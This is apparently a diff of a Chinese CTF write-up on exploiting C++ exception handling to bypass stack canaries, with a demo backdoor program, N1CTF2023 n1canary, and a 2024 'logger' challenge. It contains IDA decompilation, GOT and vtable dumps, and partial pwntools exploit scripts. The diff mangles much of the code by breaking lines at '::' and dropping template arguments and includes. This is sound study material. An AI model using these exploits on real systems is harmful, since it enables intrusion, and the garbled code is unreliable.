@@ -11,7 +11,7 @@
 // g++ exception.cpp -o exc -no-pie -fPIC
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
+#include 
 
 void backdoor()
 {
@@ -85,10 +85,14 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
 ve1kcon@wsl:~$ cyclic 56
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
 
-.got.plt:0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
-.got.plt:0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
-.got.plt:0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
-.got.plt:0000000000404058 off_404058 dq offset __cxa_end_catch
+.got.plt:
+0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
+.got.plt:
+0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
+.got.plt:
+0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
+.got.plt:
+0000000000404058 off_404058 dq offset __cxa_end_catch
 
 void test()
 {
@@ -123,13 +127,20 @@ void input()
  printf("[+] input() return.n");
 }
 
-.text:0000000000401283 lea rax, format ; "We have never called this backdoor!"
-.text:000000000040128A mov rdi, rax ; format
-.text:000000000040128D mov eax, 0
-.text:0000000000401292 ; try {
-.text:0000000000401292 call _printf
-.text:0000000000401292 ; } // starts at 401292
-.text:0000000000401297 jmp short loc_4012FF
+.text:
+0000000000401283 lea rax, format ; "We have never called this backdoor!"
+.text:
+000000000040128A mov rdi, rax ; format
+.text:
+000000000040128D mov eax, 0
+.text:
+0000000000401292 ; try {
+.text:
+0000000000401292 call _printf
+.text:
+0000000000401292 ; } // starts at 401292
+.text:
+0000000000401297 jmp short loc_4012FF
 
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
@@ -146,7 +157,7 @@ def debug(content=None):
  pause()
 
 def exp():
- # debug('b *0x401371') # call _read 
+ # debug('b *0x401371') # call _read
  # b __cxa_throw@plt
  # b *0x401506 # handler ret
  # b *(&_Unwind_RaiseException+463) # check ret
@@ -182,10 +193,15 @@ int __fastcall main(int argc, const char **argv, const char **envp)
  setbuf(stdin, 0LL, envp);
  setbuf(stdout, 0LL, v3);
  init_canary(); // canary init
- std::make_unique<BOFApp>((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
- v4 = std::unique_ptr<BOFApp>::operator->((__int64)v6); // v4 = v6
- (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::launch())
- std::unique_ptr<BOFApp>::~unique_ptr((__int64)v6);
+ std::
+make_unique((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
+ v4 = std::
+unique_ptr::
+operator->((__int64)v6); // v4 = v6
+ (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::
+launch())
+ std::
+unique_ptr::~unique_ptr((__int64)v6);
  return 0;
 }
 
@@ -194,42 +210,60 @@ __int64 init_canary(void)
  if ( getrandom(&sys_canary, 64LL, 0LL) != 64 )
  raise("canary init error");
  puts("To increase entropy, give me your canary");
- return readall<unsigned long long [8]>(&user_canary);
+ return readall(&user_canary);
 }
 
-__int64 __fastcall ProtectedBuffer<64ul>::getCanary(unsigned __int64 a1)
+__int64 __fastcall ProtectedBuffer<64ul>::
+getCanary(unsigned __int64 a1)
 {
  return user_canary[(a1 >> 4) & 7] ^ sys_canary[(a1 >> 4) & 7];
 }
 
-void __fastcall BOFApp::BOFApp(BOFApp *this)
+void __fastcall BOFApp::
+BOFApp(BOFApp *this)
 {
- UnsafeApp::UnsafeApp(this);
+ UnsafeApp::
+UnsafeApp(this);
  *(_QWORD *)this = off_4ED510;
 }
 
-__int64 __fastcall std::make_unique<BOFApp>(__int64 a1)
+__int64 __fastcall std::
+make_unique(__int64 a1)
 {
  BOFApp *v1; // rbx
 
  v1 = (BOFApp *)operator new(8uLL);
  *(_QWORD *)v1 = 0LL;
- BOFApp::BOFApp(v1);
- std::unique_ptr<BOFApp>::unique_ptr<std::default_delete<BOFApp>,void>(a1, v1);
+ BOFApp::
+BOFApp(v1);
+ std::
+unique_ptr::
+unique_ptr<std::
+default_delete,void>(a1, v1);
  return a1;
 }
 
 pwndbg> x/20gx 0x4ed510+0x10
 0x4ed520 <vtable for BOFApp+32>: 0x0000000000403552 0x0000000000000000
 
-.data.rel.ro:00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
-.data.rel.ro:00000000004ED510 ; DATA XREF: BOFApp::BOFApp(void)+16↑o
-.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()+9↑o
-.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()
-.data.rel.ro:00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
-.data.rel.ro:00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::launch(void)
+.data.rel.ro:
+00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
+.data.rel.ro:
+00000000004ED510 ; DATA XREF: BOFApp::
+BOFApp(void)+16↑o
+.data.rel.ro:
+00000000004ED510 ; BOFApp::~BOFApp()+9↑o
+.data.rel.ro:
+00000000004ED510 ; BOFApp::~BOFApp()
+.data.rel.ro:
+00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
+.data.rel.ro:
+00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::
+launch(void)
 
-__int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a2)
+__int64 __fastcall std::
+default_delete::
+operator()(__int64 a1, __int64 a2)
 {
  __int64 result; // rax
 
@@ -239,7 +273,9 @@ __int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a
  return result;
 }
 
-__int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
+__int64 __fastcall BOFApp::
+launch(void)::{lambda(char *)#1}::
+operator()(
  __int64 a1,
  __int64 a2,
  int a3,
@@ -250,13 +286,15 @@ __int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
  return _isoc23_scanf((unsigned int)"%[^n]", a2, a3, a4, a5, a6, a2, a1);
 }
 
-bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
+bool __fastcall ProtectedBuffer<64ul>::
+check(unsigned __int64 a1)
 {
  __int64 v1; // rbx
  bool result; // al
 
  v1 = *(_QWORD *)(a1 + 0x48);
- result = v1 != ProtectedBuffer<64ul>::getCanary(a1);
+ result = v1 != ProtectedBuffer<64ul>::
+getCanary(a1);
  if ( result )
  raise("*** stack smash detected ***");
  return result;
@@ -264,12 +302,18 @@ bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
 
 void __fastcall __noreturn raise(const char *a1)
 {
- std::runtime_error *exception; // rbx
+ std::
+runtime_error *exception; // rbx
 
  puts(a1);
- exception = (std::runtime_error *)_cxa_allocate_exception(0x10uLL);
- std::runtime_error::runtime_error(exception, a1);
- _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::runtime_error, std::runtime_error::~runtime_error);
+ exception = (std::
+runtime_error *)_cxa_allocate_exception(0x10uLL);
+ std::
+runtime_error::
+runtime_error(exception, a1);
+ _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::
+runtime_error, std::
+runtime_error::~runtime_error);
 }
 
 from pwn import *
@@ -291,7 +335,8 @@ def exp():
  # b *0x40340D # Destructor
  # b *0x403909 # pointer call
  # b *0x403291 # raise->throw
- # b *0x403432 # <main+146> call std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()
+ # b *0x403432 # <main+146> call std::
+unique_ptr >::~unique_ptr()
  # b *0x4038fc
  backdoor = 0x403387
  user_canary = 0x4F4AA0
@@ -386,16 +431,11 @@ https://bbs.kanxue.com/user-home-977497.htm
 ```
 一
 原理探究
-```
-
-
-
-```
 // exception.cpp
 // g++ exception.cpp -o exc -no-pie -fPIC
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
 
 void backdoor()
 {
@@ -457,39 +497,23 @@ int main()
  printf("[+] main() return.n");
  return 0;
 }
-```
-
-
-
-```
 Arch: amd64-64-little
  RELRO: Partial RELRO
  Stack: Canary found
  NX: NX enabled
  PIE: No PIE (0x400000)
-```
-
-
-
-```
 ve1kcon@wsl:~$ cyclic 48
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
 ve1kcon@wsl:~$ cyclic 56
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
-```
-
-
-
-```
-.got.plt:0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
-.got.plt:0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
-.got.plt:0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
-.got.plt:0000000000404058 off_404058 dq offset __cxa_end_catch
-```
-
-
-
-```
+.got.plt:
+0000000000404040 off_404040 dq offset fflush ; DATA XREF: _fflush+4↑r
+.got.plt:
+0000000000404048 off_404048 dq offset read ; DATA XREF: _read+4↑r
+.got.plt:
+0000000000404050 off_404050 dq offset puts ; DATA XREF: _puts+4↑r
+.got.plt:
+0000000000404058 off_404058 dq offset __cxa_end_catch
 void test()
 {
  x tmp;
@@ -509,11 +533,6 @@ void input()
  test();
  printf("[+] input() return.n");
 }
-```
-
-
-
-```
 void input()
 {
  try
@@ -526,23 +545,20 @@ void input()
  }
  printf("[+] input() return.n");
 }
-```
-
-
-
-```
-.text:0000000000401283 lea rax, format ; "We have never called this backdoor!"
-.text:000000000040128A mov rdi, rax ; format
-.text:000000000040128D mov eax, 0
-.text:0000000000401292 ; try {
-.text:0000000000401292 call _printf
-.text:0000000000401292 ; } // starts at 401292
-.text:0000000000401297 jmp short loc_4012FF
-```
-
-
-
-```
+.text:
+0000000000401283 lea rax, format ; "We have never called this backdoor!"
+.text:
+000000000040128A mov rdi, rax ; format
+.text:
+000000000040128D mov eax, 0
+.text:
+0000000000401292 ; try {
+.text:
+0000000000401292 call _printf
+.text:
+0000000000401292 ; } // starts at 401292
+.text:
+0000000000401297 jmp short loc_4012FF
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 context.terminal = ["tmux", "splitw", "-h"]
@@ -558,7 +574,7 @@ def debug(content=None):
  pause()
 
 def exp():
- # debug('b *0x401371') # call _read 
+ # debug('b *0x401371') # call _read
  # b __cxa_throw@plt
  # b *0x401506 # handler ret
  # b *(&_Unwind_RaiseException+463) # check ret
@@ -573,28 +589,13 @@ def exp():
 
 exp()
 p.interactive()
-```
-
-
-
-```
 二
 N1CTF2023 - n1canary
-```
-
-
-
-```
 Arch: amd64-64-little
  RELRO: Partial RELRO
  Stack: Canary found
  NX: NX enabled
  PIE: No PIE (0x400000)
-```
-
-
-
-```
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
  __int64 v3; // rdx
@@ -605,78 +606,71 @@ int __fastcall main(int argc, const char **argv, const char **envp)
  setbuf(stdin, 0LL, envp);
  setbuf(stdout, 0LL, v3);
  init_canary(); // canary init
- std::make_unique<BOFApp>((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
- v4 = std::unique_ptr<BOFApp>::operator->((__int64)v6); // v4 = v6
- (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::launch())
- std::unique_ptr<BOFApp>::~unique_ptr((__int64)v6);
+ std::
+make_unique((__int64)v6); // *v6 -> vtable for BOFApp+16 (0x4ed510)
+ v4 = std::
+unique_ptr::
+operator->((__int64)v6); // v4 = v6
+ (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);	// call 0x403552 (BOFApp::
+launch())
+ std::
+unique_ptr::~unique_ptr((__int64)v6);
  return 0;
 }
-```
-
-
-
-```
 __int64 init_canary(void)
 {
  if ( getrandom(&sys_canary, 64LL, 0LL) != 64 )
  raise("canary init error");
  puts("To increase entropy, give me your canary");
- return readall<unsigned long long [8]>(&user_canary);
+ return readall(&user_canary);
 }
 
-__int64 __fastcall ProtectedBuffer<64ul>::getCanary(unsigned __int64 a1)
+__int64 __fastcall ProtectedBuffer<64ul>::
+getCanary(unsigned __int64 a1)
 {
  return user_canary[(a1 >> 4) & 7] ^ sys_canary[(a1 >> 4) & 7];
 }
-```
-
-
-
-```
-void __fastcall BOFApp::BOFApp(BOFApp *this)
+void __fastcall BOFApp::
+BOFApp(BOFApp *this)
 {
- UnsafeApp::UnsafeApp(this);
+ UnsafeApp::
+UnsafeApp(this);
  *(_QWORD *)this = off_4ED510;
 }
-```
-
-
-
-```
-__int64 __fastcall std::make_unique<BOFApp>(__int64 a1)
+__int64 __fastcall std::
+make_unique(__int64 a1)
 {
  BOFApp *v1; // rbx
 
  v1 = (BOFApp *)operator new(8uLL);
  *(_QWORD *)v1 = 0LL;
- BOFApp::BOFApp(v1);
- std::unique_ptr<BOFApp>::unique_ptr<std::default_delete<BOFApp>,void>(a1, v1);
+ BOFApp::
+BOFApp(v1);
+ std::
+unique_ptr::
+unique_ptr<std::
+default_delete,void>(a1, v1);
  return a1;
 }
-```
-
-
-
-```
 pwndbg> x/20gx 0x4ed510+0x10
 0x4ed520 <vtable for BOFApp+32>: 0x0000000000403552 0x0000000000000000
-```
-
-
-
-```
-.data.rel.ro:00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
-.data.rel.ro:00000000004ED510 ; DATA XREF: BOFApp::BOFApp(void)+16↑o
-.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()+9↑o
-.data.rel.ro:00000000004ED510 ; BOFApp::~BOFApp()
-.data.rel.ro:00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
-.data.rel.ro:00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::launch(void)
-```
-
-
-
-```
-__int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a2)
+.data.rel.ro:
+00000000004ED510 off_4ED510 dq offset _ZN6BOFAppD2Ev
+.data.rel.ro:
+00000000004ED510 ; DATA XREF: BOFApp::
+BOFApp(void)+16↑o
+.data.rel.ro:
+00000000004ED510 ; BOFApp::~BOFApp()+9↑o
+.data.rel.ro:
+00000000004ED510 ; BOFApp::~BOFApp()
+.data.rel.ro:
+00000000004ED518 dq offset _ZN6BOFAppD0Ev ; BOFApp::~BOFApp()
+.data.rel.ro:
+00000000004ED520 dq offset _ZN6BOFApp6launchEv ; BOFApp::
+launch(void)
+__int64 __fastcall std::
+default_delete::
+operator()(__int64 a1, __int64 a2)
 {
  __int64 result; // rax
 
@@ -685,12 +679,9 @@ __int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 8LL))(a2);
  return result;
 }
-```
-
-
-
-```
-__int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
+__int64 __fastcall BOFApp::
+launch(void)::{lambda(char *)#1}::
+operator()(
  __int64 a1,
  __int64 a2,
  int a3,
@@ -700,18 +691,15 @@ __int64 __fastcall BOFApp::launch(void)::{lambda(char *)#1}::operator()(
 {
  return _isoc23_scanf((unsigned int)"%[^n]", a2, a3, a4, a5, a6, a2, a1);
 }
-```
-
-
-
-```
-bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
+bool __fastcall ProtectedBuffer<64ul>::
+check(unsigned __int64 a1)
 {
  __int64 v1; // rbx
  bool result; // al
 
  v1 = *(_QWORD *)(a1 + 0x48);
- result = v1 != ProtectedBuffer<64ul>::getCanary(a1);
+ result = v1 != ProtectedBuffer<64ul>::
+getCanary(a1);
  if ( result )
  raise("*** stack smash detected ***");
  return result;
@@ -719,18 +707,19 @@ bool __fastcall ProtectedBuffer<64ul>::check(unsigned __int64 a1)
 
 void __fastcall __noreturn raise(const char *a1)
 {
- std::runtime_error *exception; // rbx
+ std::
+runtime_error *exception; // rbx
 
  puts(a1);
- exception = (std::runtime_error *)_cxa_allocate_exception(0x10uLL);
- std::runtime_error::runtime_error(exception, a1);
- _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::runtime_error, std::runtime_error::~runtime_error);
+ exception = (std::
+runtime_error *)_cxa_allocate_exception(0x10uLL);
+ std::
+runtime_error::
+runtime_error(exception, a1);
+ _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::
+runtime_error, std::
+runtime_error::~runtime_error);
 }
-```
-
-
-
-```
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 context.terminal = ["tmux", "splitw", "-h"]
@@ -750,7 +739,8 @@ def exp():
  # b *0x40340D # Destructor
  # b *0x403909 # pointer call
  # b *0x403291 # raise->throw
- # b *0x403432 # <main+146> call std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()
+ # b *0x403432 # <main+146> call std::
+unique_ptr >::~unique_ptr()
  # b *0x4038fc
  backdoor = 0x403387
  user_canary = 0x4F4AA0
@@ -766,18 +756,8 @@ def exp():
 
 exp()
 p.interactive()
-```
-
-
-
-```
 三
 2024年”羊城杯“粤港澳大湾区网络安全大赛 - logger
-```
-
-
-
-```
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 context.terminal = ["tmux", "splitw", "-h"]
